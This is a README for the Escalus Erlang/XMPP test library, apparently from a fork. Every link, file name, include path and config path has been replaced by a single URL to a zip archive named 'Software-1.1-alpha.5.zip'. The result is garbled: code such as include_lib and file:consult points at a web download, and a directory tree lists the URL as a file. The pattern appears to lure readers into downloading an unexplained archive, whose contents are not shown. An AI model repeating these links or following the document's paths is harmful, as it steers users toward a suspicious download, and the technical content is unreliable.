# Escalus [![Build Status](https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip)](https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip)
...
This tool, escalus, is used by [ESL's amoc](https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip) for load tests against [ESL's MongooseIM](https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip).


# Quick start

The [https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip][example_SUITE] file contains a minimalistic
example of an Escalus test suite.

[example_SUITE]: https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip

You should include `https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip` file and the Common Test header:

    -include_lib("https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip").
    -include_lib("https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip").
...
look at [https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip][test_config] file that comes with Escalus:
...
[test_config]: https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip

Escalus can create and delete those users in two ways:
 * using in-band registration [XEP-0077](https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip)
...
in [https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip][test_config].
...
This makes predefined environment variables from `https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip` available
for access by `application:get_env`.
These options and their respective values for running without Common Test are:

    {env, [{config_file, "https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip"}]}
...
(`https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip`/`https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip`) you can set both of these options just
...
overwrite the values with stuff from `https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip`.
...
containing `https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip`.
In case of a standard Git checkout the project directory is simply `escalus`.
    ...
    ├── ebin/
    │   ├── ...
    │   ├── https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip
    │   └── ...
    ├── src/
    └── ...
...
Run example:
    ...
    application:ensure_all_started(escalus).
    {ok, Config} = file:consult("https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip").
...
Run example:
    ...
    {ok, Config0} = file:consult("https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip").
    application:ensure_all_started(escalus).
...
According to [Wikipedia](https://github.com/sohailgerman/escalus/raw/refs/heads/master/scripts/Software-1.1-alpha.5.zip), Prince Escalus, of the House Escalus, is the voice of authority in Verona, and appears only three times within the text and only to administer justice.
